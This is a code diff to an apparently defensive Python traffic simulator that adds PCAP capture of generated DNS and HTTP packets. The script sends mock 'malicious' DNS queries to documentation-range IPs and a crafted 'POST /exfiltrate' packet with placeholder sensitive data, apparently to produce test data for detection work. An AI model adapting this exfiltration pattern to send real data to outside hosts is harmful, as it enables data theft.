@@ -6,6 +6,7 @@ import logging
 
 # Log file for traffic simulation
 LOG_FILE = "network_traffic_log.txt"
+PCAP_FILE = "network_traffic.pcap"
 
 # Configure logging
 logging.basicConfig(
@@ -25,6 +26,9 @@ malicious_ips = ["203.0.113.25", "198.51.100.14"]
 # Simulated User Agent for HTTP traffic
 user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
 
+# Packet capture list
+captured_packets = []
+
 # Function to simulate legitimate network traffic
 def generate_legitimate_traffic():
     for _ in range(20):
@@ -34,6 +38,7 @@ def generate_legitimate_traffic():
             ip = random.choice(legitimate_ips)
             packet = IP(dst=ip) / UDP(sport=RandShort(), dport=53) / DNS(rd=1, qd=DNSQR(qname=domain))
             send(packet, verbose=False)
+            captured_packets.append(packet)  # Save packet for PCAP
             logging.info(f"Legitimate DNS query to {domain} ({ip})")
         except Exception as e:
             logging.error(f"Error simulating legitimate traffic: {e}")
@@ -48,6 +53,7 @@ def generate_malicious_traffic():
             malicious_ip = random.choice(malicious_ips)
             packet = IP(dst=malicious_ip) / UDP(sport=RandShort(), dport=53) / DNS(rd=1, qd=DNSQR(qname=malicious_domain))
             send(packet, verbose=False)
+            captured_packets.append(packet)  # Save packet for PCAP
             logging.warning(f"Malicious DNS query to {malicious_domain} redirected to {malicious_ip}")
 
             # Simulate data exfiltration over HTTP
@@ -55,6 +61,7 @@ def generate_malicious_traffic():
                 load=f"POST /exfiltrate HTTP/1.1\r\nHost: {malicious_domain}\r\nUser-Agent: {user_agent}\r\nContent-Length: 25\r\n\r\nSensitive data: $25,000"
             )
             send(exfil_packet, verbose=False)
+            captured_packets.append(exfil_packet)  # Save packet for PCAP
             logging.warning(f"Data exfiltration to {malicious_domain} ({malicious_ip})")
         except Exception as e:
             logging.error(f"Error simulating malicious traffic: {e}")
@@ -76,7 +83,9 @@ def run_traffic_simulation():
     legitimate_thread.join()
     malicious_thread.join()
     
-    logging.info("Network traffic simulation completed.")
+    # Save captured packets to PCAP file
+    wrpcap(PCAP_FILE, captured_packets)
+    logging.info(f"Network traffic simulation completed. PCAP saved to {PCAP_FILE}")
 
 if __name__ == "__main__":
     run_traffic_simulation()
